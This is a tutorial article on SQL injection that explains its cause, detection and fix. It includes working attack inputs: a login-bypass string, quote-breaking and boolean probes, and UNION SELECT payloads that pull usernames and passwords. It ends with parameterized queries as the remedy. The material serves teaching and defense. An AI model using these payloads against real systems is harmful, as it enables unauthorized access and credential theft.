**SQL injection (SQLi)** happens when untrusted input is concatenated into a SQL
query, letting an attacker alter the query's structure rather than just its
data. The root cause is mixing code and data — the same class of bug behind most
injection vulnerabilities.

## Why it happens

Consider a login query built by string concatenation:

```sql title="Vulnerable query"
SELECT * FROM users
WHERE username = '$user' AND password = '$pass';
```

If `$user` is `admin' --`, the query becomes:

```sql title="Injected query"
SELECT * FROM users
WHERE username = 'admin' -- ' AND password = '';
```

The `--` comments out the password check, and you're logged in as `admin`.

## Detect it

The first signal is that a single quote breaks the response — an error, a
different page, or a change in behaviour:

```text title="Classic probes"
'
' OR '1'='1
1' AND '1'='2
```

A reliable, lower-noise approach is **boolean-based** testing: send a condition
that's always true, then one that's always false, and compare responses.

```text title="True vs false"
id=10 AND 1=1     -- page loads normally
id=10 AND 1=2     -- page differs → likely injectable
```

## UNION-based extraction

When results are reflected, `UNION SELECT` lets you append your own row. First
find the column count, then pull data:

```sql title="Determine columns, then extract"
' ORDER BY 3 -- -
' UNION SELECT username, password, NULL FROM users -- -
```

<Callout type="tip" title="Let tooling do the grind">
  Once you've confirmed a parameter is injectable, <code>sqlmap</code> automates
  fingerprinting and extraction. Use it to save time, but understand the manual
  technique first — you'll need it when the automation stalls.
</Callout>

## The fix: parameterized queries

The durable fix is to never build queries by concatenation. Use parameterized
statements so input is always treated as data:

```python title="Safe — parameterized"
cur.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (user, password),
)
```

<Callout type="warning" title="Injection can be destructive">
  Stacked queries and certain payloads can modify or delete data. On an
  authorized test, prefer read-only proofs and never run destructive statements
  against data you don't own.
</Callout>

## Recap

- SQLi comes from concatenating input into queries.
- Detect with quote-breaking and boolean true/false comparisons.
- Extract with `UNION SELECT`; fix with parameterized queries.
